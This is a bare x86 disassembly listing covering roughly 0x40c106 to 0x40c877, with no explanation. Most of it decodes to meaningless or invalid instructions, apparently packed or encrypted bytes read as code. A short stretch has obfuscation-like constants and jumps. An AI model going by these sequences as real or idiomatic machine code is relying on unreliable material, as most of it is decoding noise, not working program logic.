  40c106:	mov    ecx,0xd78dcdb0
  40c10b:	ds mov ebx,0x77e3b716
  40c111:	aad    0x23
  40c113:	sbb    eax,0x9f1a88ec
  40c118:	xchg   BYTE PTR [edx],ch
  40c11a:	xor    DWORD PTR [ebx+0x4f78fb1],ecx
  40c120:	dec    eax
  40c121:	mov    ah,0x10
  40c123:	xchg   BYTE PTR [esi+0x5d],dl
  40c126:	test   eax,0x646d3b96
  40c12b:	xor    eax,eax
  40c12d:	pop    ecx
  40c12e:	push   edi
  40c12f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c130:	aad    0x32
  40c132:	addr16 add eax,0x857d1ae
  40c138:	add    eax,0xba866cfd
  40c13d:	sbb    al,0xf3
  40c13f:	add    DWORD PTR [edi-0x24],edi
  40c142:	cmp    eax,0x43425300
  40c147:	mov    cl,0x7c
  40c149:	stos   BYTE PTR es:[edi],al
  40c14a:	pop    ebp
  40c14b:	out    0x2f,al
  40c14d:	and    al,BYTE PTR [ebp-0x77]
  40c150:	or     BYTE PTR [eax+0x32bbc802],bl
  40c156:	mov    WORD PTR [edx-0x37a0eb6e],ds
  40c15c:	or     ebp,esp
  40c15e:	stos   DWORD PTR es:[edi],eax
  40c15f:	inc    eax
  40c160:	stos   DWORD PTR es:[edi],eax
  40c161:	int3   
  40c162:	xchg   esp,eax
  40c163:	retf   
  40c164:	ret    
  40c165:	imul   edx,edx,0x14
  40c168:	cmc    
  40c169:	mov    cl,0x6d
  40c16b:	ret    0xc2ea
  40c16e:	jmp    0x963a9626
  40c173:	lea    eax,[eax]
  40c175:	rcr    BYTE PTR [ebx+ecx*4],0x87
  40c179:	je     0x40c18d
  40c17b:	sbb    ah,BYTE PTR [edx-0x799cf224]
  40c181:	sub    ecx,esi
  40c183:	dec    edi
  40c185:	arpl   WORD PTR ds:0xcd2373ab,bx
  40c18b:	mov    edi,0xdf378c04
  40c190:	aam    0x1e
  40c192:	push   ebx
  40c193:	and    eax,0x5c11000
  40c198:	or     eax,0xac6b8c77
  40c19d:	es push ebx
  40c19f:	pop    ecx
  40c1a0:	add    DWORD PTR [ebx],eax
  40c1a2:	xchg   esp,eax
  40c1a3:	mov    dh,BYTE PTR [edi]
  40c1a5:	push   edx
  40c1a6:	imul   esi,DWORD PTR [ecx-0x59],0x16ee2eaf
  40c1ad:	pop    ebp
  40c1ae:	cmp    ah,BYTE PTR [ebx]
  40c1b0:	dec    edx
  40c1b1:	inc    ebx
  40c1b2:	cmc    
  40c1b3:	icebp  
  40c1b4:	sbb    edx,DWORD PTR [esi-0x24ea778f]
  40c1ba:	push   0xc4d82fd
  40c1bf:	push   0x7c
  40c1c1:	fld    QWORD PTR [edx]
  40c1c3:	mov    ecx,0x1dc10ce7
  40c1c8:	jl     0x40c231
  40c1ca:	gs xchg esp,eax
  40c1cc:	mov    esi,0x2d8bd76f
  40c1d1:	add    DWORD PTR [eax+edi*4+0x47],edi
  40c1d5:	sub    eax,0x5309c5c
  40c1da:	imul   ebx,ecx,0xba537827
  40c1e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1e2:	sub    al,0x60
  40c1e4:	jns    0x40c236
  40c1e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1e7:	sbb    BYTE PTR [edi+edi*1],0x77
  40c1eb:	repz adc BYTE PTR [eax],dh
  40c1ee:	pop    ds
  40c1ef:	mov    esi,0x7789b72e
  40c1f4:	(bad)  
  40c1f6:	loop   0x40c1b5
  40c1f8:	mov    BYTE PTR [esi+0x64beb122],bl
  40c1fe:	shl    DWORD PTR [esp+ecx*4-0x43],cl
  40c202:	dec    eax
  40c203:	scas   al,BYTE PTR es:[edi]
  40c204:	sbb    BYTE PTR gs:0x33344780,bl
  40c20b:	mov    ch,0x64
  40c20d:	fs push ds
  40c20f:	jl     0x40c23b
  40c211:	mov    dh,0x8d
  40c213:	sbb    esp,DWORD PTR [ebx+ebx*2-0x63]
  40c217:	and    al,0x70
  40c219:	clc    
  40c21a:	cmp    DWORD PTR [eax+0x5c],ebx
  40c21d:	jle    0x40c1a1
  40c21f:	mov    dh,0xaa
  40c221:	arpl   WORD PTR cs:[edi-0xa],dx
  40c225:	mov    BYTE PTR [esi],bl
  40c227:	rcl    edx,cl
  40c229:	aas    
  40c22a:	push   0x3504c89d
  40c22f:	pusha  
  40c230:	and    BYTE PTR [ebx],ch
  40c232:	ret    0xc445
  40c235:	jmp    0x267c2d0f
  40c23a:	adc    bl,BYTE PTR [esi+0x1bd99bc7]
  40c240:	inc    esp
  40c241:	xchg   esp,eax
  40c242:	dec    eax
  40c243:	sti    
  40c244:	or     BYTE PTR [ecx-0x7e51eee8],0x53
  40c24b:	(bad)
  40c24e:	les    edi,FWORD PTR [eax+0x75]
  40c251:	mov    eax,ds:0xe75f4f55
  40c256:	or     al,0xb7
  40c258:	mov    ecx,0xbaa951e8
  40c25d:	repnz ss das 
  40c260:	adc    al,0xe
  40c262:	push   ds
  40c263:	in     al,dx
  40c264:	test   BYTE PTR [edi-0x15e5a91],dh
  40c26a:	and    DWORD PTR [edi-0x27],0x2e8f8bf
  40c271:	into   
  40c272:	xchg   edi,eax
  40c273:	cs jmp 0x6ce7f81e
  40c279:	lea    ebx,cs:[edi]
  40c27c:	cdq    
  40c27d:	cmp    eax,0xaba25fef
  40c282:	push   es
  40c283:	xchg   ecx,eax
  40c284:	xchg   DWORD PTR [ecx+0x96cf0c9],ebp
  40c28a:	or     eax,0x3b2e1329
  40c28f:	call   0x263c:0xbcbbf110
  40c296:	mov    edx,ecx
  40c298:	add    edi,ebp
  40c29a:	ins    BYTE PTR es:[edi],dx
  40c29b:	sti    
  40c29c:	(bad)  
  40c29d:	(bad)  
  40c29f:	scas   al,BYTE PTR es:[edi]
  40c2a0:	(bad)  
  40c2a1:	loope  0x40c2a1
  40c2a3:	jae    0x40c2f9
  40c2a5:	lds    ecx,FWORD PTR [esi]
  40c2a7:	jge    0x40c2e2
  40c2a9:	loopne 0x40c283
  40c2ab:	add    al,0xd8
  40c2ad:	inc    eax
  40c2ae:	and    al,0xf6
  40c2b0:	jnp    0x40c2e5
  40c2b2:	and    eax,0xead03731
  40c2b7:	and    DWORD PTR [ecx],edx
  40c2b9:	inc    ebp
  40c2ba:	in     al,0x5
  40c2bc:	inc    esi
  40c2bd:	xchg   edx,eax
  40c2be:	dec    eax
  40c2bf:	retf   
  40c2c0:	aas    
  40c2c1:	and    ah,BYTE PTR [ecx]
  40c2c3:	js     0x40c271
  40c2c5:	jae    0x40c2e5
  40c2c7:	imul   eax,DWORD PTR [edx],0xffffffbc
  40c2ca:	xchg   esi,eax
  40c2cb:	stos   BYTE PTR es:[edi],al
  40c2cc:	dec    edi
  40c2cd:	lds    edx,FWORD PTR [ebp-0x2f]
  40c2d0:	out    0x36,al
  40c2d2:	and    eax,DWORD PTR [ebx]
  40c2d4:	into   
  40c2d5:	ret    
  40c2d6:	inc    edi
  40c2d7:	mov    ds:0x4cebad9e,eax
  40c2dc:	sub    ch,BYTE PTR [ebx+0x4d]
  40c2df:	or     al,0xb1
  40c2e1:	retf   
  40c2e2:	and    al,0x24
  40c2e4:	or     DWORD PTR [edx],eax
  40c2e6:	push   esi
  40c2e7:	xchg   esp,eax
  40c2e8:	adc    ebp,DWORD PTR [edi-0x68]
  40c2eb:	xor    BYTE PTR [edx+0x2d4d2db1],ch
  40c2f1:	sub    DWORD PTR [edx-0x1e],edi
  40c2f4:	pop    esi
  40c2f5:	sbb    DWORD PTR [ebp-0x15],0xffffffde
  40c2f9:	mov    edx,0x9fc43457
  40c2fe:	setbe  BYTE PTR [edx-0x31]
  40c302:	out    dx,eax
  40c303:	pop    ebp
  40c304:	inc    ebx
  40c305:	mov    ecx,0xb1388853
  40c30a:	push   cs
  40c30b:	gs inc ecx
  40c30d:	inc    esi
  40c30e:	(bad)  
  40c30f:	lock jp 0x40c311
  40c312:	jne    0x40c29b
  40c314:	fiadd  DWORD PTR [ebp-0x52f99454]
  40c31a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c31b:	ds push esp
  40c31d:	loop   0x40c34d
  40c31f:	lahf   
  40c320:	aas    
  40c321:	scas   eax,DWORD PTR es:[edi]
  40c322:	jmp    0x40c2d7
  40c324:	ds dec esi
  40c326:	aad    0x77
  40c328:	pop    ebp
  40c329:	push   ss
  40c32a:	jae    0x40c37c
  40c32c:	or     ah,dl
  40c32e:	xor    ch,BYTE PTR [ecx-0x17]
  40c331:	ja     0x40c2f1
  40c333:	retf   0x1079
  40c336:	test   esp,eax
  40c338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c339:	outs   dx,DWORD PTR ds:[esi]
  40c33a:	ror    BYTE PTR [eax+0x75],0x56
  40c33e:	mov    edi,0x86ad720d
  40c343:	push   es
  40c344:	ins    DWORD PTR es:[edi],dx
  40c345:	sahf   
  40c346:	or     esi,DWORD PTR [ebp-0x1062796c]
  40c34c:	sahf   
  40c34d:	and    DWORD PTR [ebp-0x72c1e671],esi
  40c353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c354:	pop    edx
  40c355:	lods   al,BYTE PTR ds:[esi]
  40c356:	jge    0x40c33e
  40c358:	loopne 0x40c2fc
  40c35a:	aam    0xf7
  40c35c:	pop    ds
  40c35d:	xor    esp,DWORD PTR [ebx-0x1db50b3b]
  40c363:	xchg   esp,eax
  40c364:	push   0x39
  40c366:	jge    0x40c36b
  40c368:	push   0xabbe5269
  40c36d:	sub    eax,0x630c97d6
  40c372:	test   al,0xb2
  40c374:	pushf  
  40c375:	mov    db4,ebp
  40c378:	adc    ah,BYTE PTR [ebx]
  40c37a:	sub    BYTE PTR [ebx+0x7d],bh
  40c37d:	sbb    DWORD PTR [ebp-0x351451f5],edx
  40c383:	fnstenv [ecx+0x19899e97]
  40c389:	in     al,dx
  40c38a:	push   cs
  40c38b:	sub    eax,0xbe051e0e
  40c390:	unpcklps xmm3,XMMWORD PTR [ebx+edx*2]
  40c394:	sub    al,0xfe
  40c396:	std    
  40c397:	rol    BYTE PTR [esi],1
  40c399:	jbe    0x40c3d2
  40c39b:	sub    BYTE PTR [ebx-0x2d],bh
  40c39e:	arpl   cx,bp
  40c3a0:	pop    ss
  40c3a1:	mov    esi,0xa2379201
  40c3a6:	mov    ds:0xfebea499,eax
  40c3ab:	repnz dec edi
  40c3ad:	adc    cl,ch
  40c3af:	fiadd  WORD PTR [edx-0x2961f434]
  40c3b5:	add    eax,0xf911de5e
  40c3ba:	sbb    BYTE PTR [eax+0x36],bl
  40c3bd:	out    0x95,al
  40c3bf:	mov    ds:0xe99c3420,al
  40c3c4:	push   es
  40c3c5:	loope  0x40c3fc
  40c3c7:	and    edx,DWORD PTR ds:[edx-0x10e09074]
  40c3ce:	or     cl,BYTE PTR [esi-0x7d02fd6c]
  40c3d4:	mov    esp,0x442c21f7
  40c3d9:	cmp    al,ah
  40c3db:	cwde   
  40c3dc:	pop    esi
  40c3dd:	sti    
  40c3de:	(bad)  
  40c3e0:	sub    eax,0x5c85b139
  40c3e5:	ins    BYTE PTR es:[edi],dx
  40c3e6:	dec    ebp
  40c3e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3e8:	fwait
  40c3e9:	stos   BYTE PTR es:[edi],al
  40c3ea:	repnz aam 0x99
  40c3ed:	dec    edx
  40c3ee:	xor    DWORD PTR [ecx],esi
  40c3f0:	repz jge 0x40c421
  40c3f3:	sub    DWORD PTR [edx-0x529e8493],ebx
  40c3f9:	scas   al,BYTE PTR es:[edi]
  40c3fa:	sbb    BYTE PTR [esi+0x11a83aab],0xcf
  40c401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c402:	mov    edi,0x4e6934ad
  40c407:	cmp    BYTE PTR [eax],0x9c
  40c40a:	xchg   edx,eax
  40c40b:	(bad)  
  40c40c:	mov    ch,0xc
  40c40e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c40f:	ja     0x40c44d
  40c411:	xchg   edx,eax
  40c412:	xor    bl,BYTE PTR [esi-0x4e]
  40c415:	and    bh,BYTE PTR [ebx]
  40c417:	jge    0x40c406
  40c419:	cmp    ecx,DWORD PTR [ebp-0x39a1ae83]
  40c41f:	fild   QWORD PTR [edx]
  40c421:	addr16 test bh,al
  40c424:	jmp    0xe810519f
  40c429:	inc    ebp
  40c42b:	ins    DWORD PTR es:[edi],dx
  40c42c:	(bad)  
  40c42d:	xchg   edi,eax
  40c42e:	popa   
  40c42f:	test   DWORD PTR [edx],edx
  40c431:	std    
  40c432:	pusha  
  40c433:	sub    al,0x98
  40c435:	test   DWORD PTR [eax+eiz*2-0x518fb17d],ecx
  40c43c:	(bad)  
  40c43d:	jl     0x40c443
  40c43f:	aas    
  40c440:	mov    DWORD PTR [ebx-0x1370de99],eax
  40c446:	sub    BYTE PTR ds:0x623394cd,bl
  40c44c:	and    al,0xed
  40c44e:	xchg   ecx,eax
  40c44f:	popf   
  40c450:	daa    
  40c451:	lods   al,BYTE PTR ds:[esi]
  40c452:	shr    DWORD PTR [edx],0x3d
  40c455:	jl     0x40c458
  40c457:	sbb    BYTE PTR [edi],0x40
  40c45a:	loope  0x40c3f2
  40c45c:	in     eax,0x35
  40c45e:	pop    ds
  40c45f:	outs   dx,DWORD PTR ds:[esi]
  40c460:	add    eax,0xc1932345
  40c465:	mov    DWORD PTR [esi],ecx
  40c467:	loope  0x40c458
  40c469:	in     al,dx
  40c46a:	cs pop esi
  40c46c:	(bad)  
  40c46d:	test   eax,0x4ef59ae0
  40c472:	mov    ds:0x21930cf0,eax
  40c477:	fs adc eax,0xc886e4ed
  40c47d:	shl    dl,0x84
  40c480:	add    al,0xa6
  40c482:	lods   eax,DWORD PTR ds:[esi]
  40c483:	jbe    0x40c4c0
  40c485:	cdq    
  40c486:	loope  0x40c477
  40c488:	jae    0x40c4ba
  40c48a:	adc    BYTE PTR [edi+0x74],ch
  40c48d:	das    
  40c48e:	pop    edx
  40c48f:	stc    
  40c490:	dec    edi
  40c491:	pop    esp
  40c492:	test   al,0xd5
  40c494:	mov    esi,0x8d359062
  40c499:	dec    ebp
  40c49a:	xor    al,0xb8
  40c49c:	call   0x6e00:0xbea2df21
  40c4a3:	gs jp  0x40c473
  40c4a6:	and    BYTE PTR [esi+0x37],bh
  40c4a9:	sbb    dl,BYTE PTR [eax+0x12]
  40c4ac:	pop    esp
  40c4ad:	cmp    BYTE PTR [eax+0x4700b887],ch
  40c4b3:	mov    esp,0x4c0d819b
  40c4b8:	mov    eax,ds:0xf527372a
  40c4bd:	or     eax,0x9dfe2b7b
  40c4c2:	jp     0x40c507
  40c4c4:	push   esi
  40c4c5:	lods   eax,DWORD PTR ds:[esi]
  40c4c6:	dec    eax
  40c4c7:	mov    ds:0xaa052ce,al
  40c4cc:	lahf   
  40c4cd:	cmp    DWORD PTR [eax+0x55],esi
  40c4d0:	mov    ch,0x73
  40c4d2:	and    BYTE PTR [esi-0x7b5452e1],dh
  40c4d8:	in     al,0x2c
  40c4da:	add    al,0x97
  40c4dc:	xchg   esi,eax
  40c4dd:	jbe    0x40c55e
  40c4df:	ins    DWORD PTR es:[edi],dx
  40c4e0:	out    dx,eax
  40c4e1:	sbb    al,0xc4
  40c4e3:	clc    
  40c4e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4e5:	sti    
  40c4e6:	test   DWORD PTR es:[edx-0x3b79a404],edx
  40c4ed:	sbb    DWORD PTR [edx+0x15],edx
  40c4f0:	jecxz  0x40c4e0
  40c4f2:	inc    eax
  40c4f3:	imul   edx,edi
  40c4f6:	mov    DWORD PTR [ebp+0xc],edx
  40c4f9:	mov    edx,DWORD PTR [ebp+0xc]
  40c4fc:	mov    DWORD PTR [ebp-0x24],edx
  40c4ff:	mov    edx,DWORD PTR [ebp-0x8]
  40c502:	add    edx,DWORD PTR [ebp-0x40]
  40c505:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40c50c:	mov    DWORD PTR [ebp-0x1c],edx
  40c50f:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  40c516:	mov    DWORD PTR [ebp-0x44],0xf89c8538
  40c51d:	mov    edx,DWORD PTR [ebp-0x18]
  40c520:	xor    edx,eax
  40c522:	add    edx,ecx
  40c524:	jmp    0x40cdbf
  40c529:	mov    edx,DWORD PTR [ebp-0x18]
  40c52c:	xor    edx,eax
  40c52e:	jmp    0x40c945
  40c533:	sub    al,0x9b
  40c535:	inc    edx
  40c536:	(bad)  
  40c537:	dec    ebp
  40c538:	idiv   DWORD PTR [ebp+esi*2-0x2cf58fc4]
  40c53f:	jmp    0xd1169917
  40c544:	xchg   esi,eax
  40c545:	jle    0x40c5c5
  40c547:	jo     0x40c5c2
  40c549:	jle    0x40c5c9
  40c54b:	mov    ah,0x6a
  40c54d:	add    esp,ecx
  40c54f:	xor    al,0xb4
  40c551:	adc    DWORD PTR [ebx-0x3fd9e13a],edx
  40c557:	out    dx,al
  40c558:	jp     0x40c50d
  40c55a:	and    DWORD PTR [ebx+ebp*8-0x56],edi
  40c55e:	idiv   BYTE PTR [esi]
  40c560:	mov    al,ds:0x70046ca3
  40c565:	jp     0x40c4f0
  40c567:	or     al,0x1
  40c569:	je     0x40c55d
  40c56b:	pop    eax
  40c56c:	ins    DWORD PTR es:[edi],dx
  40c56d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c56e:	arpl   WORD PTR [esp+eax*4-0x12],cx
  40c572:	mov    BYTE PTR [edi],cl
  40c574:	pop    edx
  40c575:	out    0xcb,eax
  40c577:	dec    eax
  40c578:	(bad)  
  40c579:	xchg   ecx,eax
  40c57a:	mov    bl,0x64
  40c57c:	cmp    cl,BYTE PTR [ebp+esi*8-0x2d38bd4f]
  40c583:	mov    edx,0x1ac0e901
  40c588:	jge    0x40c5d4
  40c58a:	add    ebx,DWORD PTR [eax+0x2012a07e]
  40c590:	je     0x40c603
  40c592:	jne    0x40c5cb
  40c594:	out    dx,eax
  40c595:	xor    DWORD PTR ds:0xb3abce81,ebx
  40c59b:	sub    DWORD PTR [eax],esp
  40c59d:	pop    DWORD PTR [ebp-0x2d]
  40c5a0:	icebp  
  40c5a1:	xchg   esp,eax
  40c5a2:	xchg   esp,eax
  40c5a3:	outs   dx,BYTE PTR ds:[esi]
  40c5a4:	add    DWORD PTR [ebp+0x26],edx
  40c5a7:	js     0x40c5a2
  40c5a9:	lods   eax,DWORD PTR ds:[esi]
  40c5aa:	xchg   esi,eax
  40c5ab:	neg    dh
  40c5ad:	js     0x40c540
  40c5af:	cmp    bl,BYTE PTR [edx-0x15290e7b]
  40c5b5:	enter  0xac9c,0x48
  40c5b9:	out    0xff,al
  40c5bb:	add    eax,0x7cd0b91f
  40c5c0:	bound  esi,QWORD PTR [esi]
  40c5c2:	pop    edi
  40c5c3:	mov    ch,0x8b
  40c5c5:	(bad)  
  40c5c6:	cmp    bl,BYTE PTR [edi+0x28301f49]
  40c5cc:	cmc    
  40c5cd:	jge    0x40c55f
  40c5cf:	add    BYTE PTR [ebx+0x14],ah
  40c5d2:	add    BYTE PTR [ecx],al
  40c5d4:	cmp    ch,BYTE PTR [eax]
  40c5d6:	es ret 
  40c5d8:	test   BYTE PTR [ebx+eax*1+0x3b],dl
  40c5dc:	xor    DWORD PTR [ecx],0xb8bf624f
  40c5e2:	xchg   ecx,eax
  40c5e3:	clc    
  40c5e4:	pop    es
  40c5e5:	jmp    0x412ebc06
  40c5ea:	adc    ch,al
  40c5ec:	pop    edx
  40c5ed:	or     BYTE PTR [edi],ch
  40c5ef:	push   edx
  40c5f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5f1:	int3   
  40c5f2:	iret   
  40c5f3:	mov    WORD PTR [eax+0x579c271],ss
  40c5f9:	push   es
  40c5fa:	call   0x75d1:0x8f4870f9
  40c601:	xchg   ebp,eax
  40c602:	outs   dx,BYTE PTR ds:[esi]
  40c603:	dec    esp
  40c604:	das    
  40c605:	jle    0x40c619
  40c607:	jnp    0x40c680
  40c609:	dec    ecx
  40c60a:	add    al,0xff
  40c60c:	push   eax
  40c60d:	jnp    0x40c62e
  40c60f:	fucomi st,st(6)
  40c611:	mov    edi,0xb36a5953
  40c616:	test   al,0x6e
  40c618:	or     ah,bh
  40c61a:	dec    ebp
  40c61b:	push   eax
  40c61c:	jbe    0x40c655
  40c61e:	adc    BYTE PTR [edi-0x18],0xa8
  40c622:	jmp    0x40c665
  40c624:	(bad)  
  40c626:	ss (bad) 
  40c628:	rol    al,0xa4
  40c62b:	ja     0x40c689
  40c62d:	mov    cl,0x23
  40c62f:	mov    ds,WORD PTR [edi]
  40c631:	lahf   
  40c632:	jo     0x40c693
  40c634:	pop    edi
  40c635:	rcr    eax,1
  40c637:	sbb    BYTE PTR [edx+0x1ac031e5],ch
  40c63d:	mov    WORD PTR [eax],cs
  40c63f:	sahf   
  40c640:	enter  0xab35,0x1
  40c644:	out    0xd2,al
  40c646:	fistp  DWORD PTR [edx]
  40c648:	cli    
  40c649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c64a:	stc    
  40c64b:	js     0x40c695
  40c64d:	sub    BYTE PTR [edi+eax*2-0x371d4e6],dl
  40c654:	rol    DWORD PTR [edx+0x7a5edbdc],1
  40c65a:	cmp    eax,0xa30c6c7d
  40c65f:	jge    0x40c66d
  40c661:	mov    eax,ds:0xa0b8923e
  40c666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c667:	and    al,0xd2
  40c669:	in     al,0xdc
  40c66b:	mov    ch,0x28
  40c66d:	es (bad) 
  40c66f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c670:	pop    esp
  40c671:	mov    edi,0x3c1e6a7
  40c676:	fst    QWORD PTR [edx+0x2d1966b5]
  40c67c:	mov    bl,0x27
  40c67e:	push   ds
  40c67f:	mov    esi,0x77dca0d7
  40c684:	pop    edx
  40c685:	mov    al,0x4f
  40c687:	mov    eax,ds:0x8b9f43b0
  40c68c:	adc    BYTE PTR [eax-0x5f7a2ce6],bh
  40c692:	cld    
  40c693:	lea    ebx,[ebp-0x3f]
  40c696:	pop    ss
  40c697:	sub    ah,al
  40c699:	je     0x40c6b5
  40c69b:	pop    edi
  40c69c:	pop    ebx
  40c69d:	pushf  
  40c69e:	sahf   
  40c69f:	sub    edi,DWORD PTR [ecx]
  40c6a1:	xor    ebp,DWORD PTR [ecx+0x4ccb13b7]
  40c6a7:	adc    edx,DWORD PTR [ecx-0x2a]
  40c6aa:	push   ebx
  40c6ab:	inc    ecx
  40c6ac:	push   ss
  40c6ad:	and    edx,DWORD PTR [eax-0x20]
  40c6b0:	sub    DWORD PTR [eax+0x15],esp
  40c6b3:	es ret 0xe479
  40c6b7:	sub    al,0x2
  40c6b9:	js     0x40c725
  40c6bb:	adc    eax,0x9e1137dd
  40c6c0:	cwde   
  40c6c1:	sub    esp,DWORD PTR [ebp-0x515e01a7]
  40c6c7:	push   eax
  40c6c8:	or     al,0x7a
  40c6ca:	cmovl  eax,DWORD PTR [eax]
  40c6cd:	addr16 std 
  40c6cf:	pop    ebx
  40c6d0:	fwait
  40c6d1:	ret    0x3994
  40c6d4:	jp     0x40c6be
  40c6d6:	xchg   esp,eax
  40c6d7:	lock cwde 
  40c6d9:	cs int3 
  40c6db:	pop    ebx
  40c6dc:	inc    edx
  40c6dd:	lods   eax,DWORD PTR ds:[esi]
  40c6de:	mov    al,al
  40c6e0:	push   edx
  40c6e2:	dec    eax
  40c6e3:	(bad)  
  40c6e4:	ret    0xf650
  40c6e7:	lods   al,BYTE PTR ds:[esi]
  40c6e8:	sub    cl,BYTE PTR [esi-0x1e05e9fb]
  40c6ee:	loopne 0x40c6bc
  40c6f0:	pop    es
  40c6f1:	and    DWORD PTR [ebx-0x6b108417],0xffffffa4
  40c6f8:	jp     0x40c745
  40c6fa:	test   eax,0x18e49f24
  40c6ff:	pop    ds
  40c700:	sti    
  40c701:	jns    0x40c738
  40c703:	js     0x40c6aa
  40c705:	xchg   esi,eax
  40c706:	add    BYTE PTR [ecx+0x3d381b20],dl
  40c70c:	data16 xchg bh,bl
  40c70f:	pop    esi
  40c710:	xor    BYTE PTR [edi+0x3ea438b],dh
  40c716:	inc    ecx
  40c717:	ja     0x40c6cc
  40c719:	sub    ah,bl
  40c71b:	call   0x33e2d217
  40c720:	fdivr  QWORD PTR [esi]
  40c722:	mov    ebp,0x2b269698
  40c727:	dec    edx
  40c728:	test   al,0x79
  40c72a:	in     eax,0x2
  40c72c:	nop
  40c72d:	mov    BYTE PTR [edx],bh
  40c72f:	or     al,0xe1
  40c731:	push   cs
  40c732:	or     edx,DWORD PTR [edi+ebp*2]
  40c735:	retf   0xab88
  40c738:	stos   BYTE PTR es:[edi],al
  40c739:	push   esi
  40c73a:	cmp    esi,esi
  40c73c:	sahf   
  40c73d:	dec    esi
  40c73e:	dec    ecx
  40c73f:	loope  0x40c7ac
  40c741:	out    0x7b,al
  40c743:	das    
  40c744:	retf   
  40c745:	icebp  
  40c746:	adc    BYTE PTR [ebx],ah
  40c748:	push   ebp
  40c749:	(bad)  
  40c74a:	loopne 0x40c75a
  40c74c:	push   ebx
  40c74d:	lds    ebp,FWORD PTR [esi+0x7f9ef208]
  40c753:	cli    
  40c754:	ds mov edi,0xa4e040f7
  40c75a:	lahf   
  40c75b:	aad    0xee
  40c75d:	sbb    edx,DWORD PTR ds:0x5813c965
  40c763:	jmp    DWORD PTR [edi+0x5e]
  40c766:	dec    ecx
  40c767:	(bad)  
  40c768:	cmp    eax,0x9535c4fa
  40c76d:	and    eax,0xdbc650b0
  40c772:	pop    es
  40c773:	xchg   ecx,eax
  40c774:	aaa    
  40c775:	jge    0x40c79e
  40c777:	mov    esi,0x6dea051
  40c77c:	es fsubr st(0),st
  40c77f:	pop    eax
  40c780:	test   eax,0xd136c399
  40c785:	imul   esi,edi,0x7632ee5b
  40c78b:	bound  ecx,QWORD PTR [ecx-0x56]
  40c78e:	push   ds
  40c78f:	out    dx,eax
  40c790:	in     al,0xf9
  40c792:	push   ss
  40c793:	adc    eax,0x261d1a09
  40c798:	sub    ah,bh
  40c79a:	stos   DWORD PTR es:[edi],eax
  40c79b:	in     al,0x74
  40c79d:	scas   eax,DWORD PTR es:[edi]
  40c79e:	fstp   DWORD PTR [ecx-0x74b983ff]
  40c7a4:	sub    edi,ebp
  40c7a6:	pop    eax
  40c7a7:	jmp    0xf1fff76
  40c7ac:	loopne 0x40c738
  40c7ae:	pop    edx
  40c7af:	je     0x40c74e
  40c7b1:	jne    0x40c76c
  40c7b3:	scas   al,BYTE PTR es:[edi]
  40c7b4:	sub    al,0x74
  40c7b6:	sub    eax,0x82ae9171
  40c7bb:	or     bh,BYTE PTR [edi+0x1d0e6cd1]
  40c7c1:	sub    al,0x9c
  40c7c3:	(bad)  
  40c7c4:	jmp    0x81210aa0
  40c7c9:	push   ss
  40c7ca:	pop    ecx
  40c7cb:	dec    edx
  40c7cc:	adc    al,0xcd
  40c7ce:	jl     0x40c79e
  40c7d0:	loop   0x40c818
  40c7d2:	xchg   BYTE PTR [eax+0x2c],bh
  40c7d5:	lea    eax,[eax-0x42]
  40c7d8:	mov    dl,0xf
  40c7da:	and    al,0x5f
  40c7dc:	push   es
  40c7dd:	(bad)  
  40c7de:	cwde   
  40c7df:	out    dx,eax
  40c7e0:	xor    eax,0xc405e1cf
  40c7e5:	cmp    esp,DWORD PTR [ecx+eiz*8+0x18e36072]
  40c7ec:	cmp    al,0xfa
  40c7ee:	mov    dh,0x8d
  40c7f0:	ins    DWORD PTR es:[edi],dx
  40c7f1:	jl     0x40c786
  40c7f3:	jmp    0x40c831
  40c7f5:	shl    DWORD PTR [ebp+0x5fc752c0],0x2
  40c7fc:	(bad)  
  40c7fd:	iret   
  40c7fe:	stc    
  40c7ff:	push   ds
  40c800:	loopne 0x40c7cd
  40c802:	(bad)  
  40c804:	aaa    
  40c805:	aaa    
  40c806:	add    al,0xe7
  40c808:	add    al,0xe
  40c80a:	fstp   st(5)
  40c80c:	mov    fs,WORD PTR [ebp+eiz*2+0x1e8a8acd]
  40c813:	shl    BYTE PTR [edx],0x64
  40c816:	jno    0x40c878
  40c818:	popa   
  40c819:	xchg   edx,eax
  40c81a:	xor    bh,BYTE PTR [edi]
  40c81c:	adc    al,0x15
  40c81e:	and    BYTE PTR [ebp+ebx*2+0x55],ah
  40c822:	stos   DWORD PTR es:[edi],eax
  40c823:	jne    0x40c7af
  40c825:	jne    0x40c848
  40c827:	push   0x1fc1a55d
  40c82c:	xchg   edx,eax
  40c82d:	and    eax,DWORD PTR [edx]
  40c82f:	repz sar BYTE PTR [esi+0x3d],1
  40c833:	call   0xd69a:0x7af323da
  40c83a:	daa    
  40c83b:	fwait
  40c83c:	xor    esi,ebx
  40c83e:	cs sahf 
  40c840:	jmp    0xa443:0x5e26bb36
  40c847:	mov    ah,0x47
  40c849:	push   0xdece444f
  40c84e:	retf   0x70b3
  40c851:	mov    ss,eax
  40c853:	int3   
  40c854:	cmp    ch,BYTE PTR [edx-0x1db707ed]
  40c85a:	addr16 mov edi,0x97cc8879
  40c860:	mov    dl,BYTE PTR [ebp+eiz*1+0xb55072]
  40c867:	test   al,0x98
  40c869:	cmp    BYTE PTR [ecx+eax*4],cl
  40c86c:	sub    al,0x3c
  40c86e:	dec    esp
  40c86f:	dec    esi
  40c870:	and    edx,DWORD PTR [ecx+0x77af01a5]
  40c876:	inc    eax
  40c877:	xor    eax,DWORD PTR gs:[edx+esi*2-0xa]
